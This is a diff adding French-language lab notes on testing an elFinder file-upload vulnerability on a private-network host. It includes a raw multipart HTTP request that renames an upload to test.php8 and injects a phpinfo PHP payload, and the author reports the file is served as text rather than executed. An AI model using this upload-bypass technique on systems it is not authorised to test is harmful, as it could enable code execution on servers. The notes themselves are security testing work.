@@ -42,4 +42,54 @@ On va test https://security.snyk.io/vuln/SNYK-PHP-STUDIO42ELFINDER-8320938
 3 - Set filename like test.php8
 4 - After forwarding the request, the file is successfully uploaded under the files directory
 
+On balance le jpg dans la requete
 
+reperter 
+POST /php/connector.minimal.php HTTP/1.1
+Host: 192.168.53.243
+Content-Length: 147336
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6WbghxyAqzAvisbV
+Accept: */*
+Origin: http://192.168.53.243
+Referer: http://192.168.53.243/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=j25l4s55maelrs72n724sismpr
+Connection: keep-alive
+
+------WebKitFormBoundary6WbghxyAqzAvisbV
+Content-Disposition: form-data; name="reqid"
+
+19d1b1d6dbba2
+------WebKitFormBoundary6WbghxyAqzAvisbV
+Content-Disposition: form-data; name="cmd"
+
+upload
+------WebKitFormBoundary6WbghxyAqzAvisbV
+Content-Disposition: form-data; name="target"
+
+l1_Lw
+------WebKitFormBoundary6WbghxyAqzAvisbV
+Content-Disposition: form-data; name="upload[]"; filename="test.jpg"
+Content-Type: image/jpeg
+
+ÿØÿà
+php8
+
+modifier Content-Disposition: form-data; name="upload[]"; filename="test.jpg"
+en Content-Disposition: form-data; name="upload[]"; filename="test.php8"
+Dans l’onglet Raw, On sélectionne tout ce qui suit la ligne vide après Content-Type: image/png
+
+et on écrit 
+
+test<?php phpinfo();?>
+Send -> reponse 200 Ok
+http://192.168.53.243/files/test.php8
+On voit le text "test<?php phpinfo();?>"
+
+https://github.com/Studio-42/elFinder/issues/3458
+J'ai trouvé un autre POC qui modifie en test.php.. 
+puis a<?php phpinfo();?>
+Mais ça m'affiche tjr en text
+Réponse 200 OK
